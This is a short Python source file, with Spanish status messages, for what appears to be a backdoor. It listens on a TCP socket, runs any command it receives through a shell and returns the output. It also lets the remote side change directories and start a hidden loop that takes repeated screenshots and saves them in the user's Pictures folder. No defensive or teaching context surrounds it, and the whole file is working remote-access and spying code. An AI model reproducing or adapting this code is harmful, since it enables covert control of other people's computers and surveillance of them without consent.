#-*-coding: utf-8-*-
from socket import *
from os import popen, getcwd, chdir
from getpass import getuser
from pyautogui import screenshot
from threading import *
from datetime import date
from time import sleep


class Bd():
	def __init__(self, ip = "127.0.0.1", port = 5000):
		sock = socket(AF_INET, SOCK_STREAM)
		sock.bind(("127.0.0.1", 5000))
		sock.listen(1)
		self.conn, addr = sock.accept()
		t = int()
		d = "C:\\Users\\{}\\Pictures\\".format(getuser())
		self.check = False
		while True:
			cmd = self.conn.recv(1024).decode()
			if cmd[:2] == "cd":
				try:
					chdir(cmd[3:])
				except:
					pass
				finally:
					self.conn.send("{}".format(getcwd()).encode())
			elif cmd == "sass":
				self.check = True
				f = Thread(target=self.photo,args=(t, d,))
				f.daemon = True
				f.start()
			elif cmd[:6] == "setdir":
				try:
					d = cmd[7:]
				except Exception as e:
					self.conn.send("{}".format(e).encode())
				else:
					self.conn.send("Variable declarada correctamente.".encode())
			elif cmd[:7] =="settime":
				try:
					t = int(cmd[8:])
				except Exception as e:
					self.conn.send("{}".format(e).encode())
				else:
					self.conn.send("Variable declarada correctamente".encode())
			elif cmd == "stopss":
				self.check = False
			else:
				out = popen(cmd).read()
				self.conn.send(out.encode())



	def photo(self, time, dr):
		chdir(dr)
		count = 1
		while True:
			if self.check == False:
				self.conn.send("Se han detenido las capturas de pantalla.".encode())
				break
			ss = screenshot()
			ss.save("{}-{}.png".format(date.today(),count))
			count += 1
			sleep(time)



if __name__ == '__main__':
	main = Bd()
	



